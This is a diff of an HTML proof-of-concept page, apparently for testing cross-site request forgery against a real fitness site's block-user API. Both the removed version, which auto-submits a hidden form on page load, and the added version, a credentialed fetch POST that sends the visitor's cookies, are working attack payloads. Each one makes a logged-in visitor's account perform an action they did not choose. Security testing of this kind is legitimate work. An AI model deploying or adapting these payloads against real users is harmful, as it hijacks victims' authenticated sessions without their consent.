@@ -1,9 +1,26 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-  <body>
-    <form id="f" action="https://www.myfitnesspal.com/api/services/blocked_users/block" method="POST">
-      <input type="hidden" name="username" value="MyFitnessPal">
-    </form>
-    <script>document.getElementById('f').submit();</script>
-  </body>
+<body>
+<h3>CORS CSRF Test</h3>
+<script>
+fetch("https://www.myfitnesspal.com/api/services/blocked_users/block", {
+    method: "POST",
+    credentials: "include", // Send cookies
+    headers: {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer TEST" // See if CORS allows this
+    },
+    body: JSON.stringify({
+        target_user_id: 123456 // Change to test payload
+    })
+})
+.then(response => response.text())
+.then(text => {
+    document.body.innerHTML += "<pre>Response:\n" + text + "</pre>";
+})
+.catch(err => {
+    document.body.innerHTML += "<pre>CORS or network error:\n" + err + "</pre>";
+});
+</script>
+</body>
 </html>
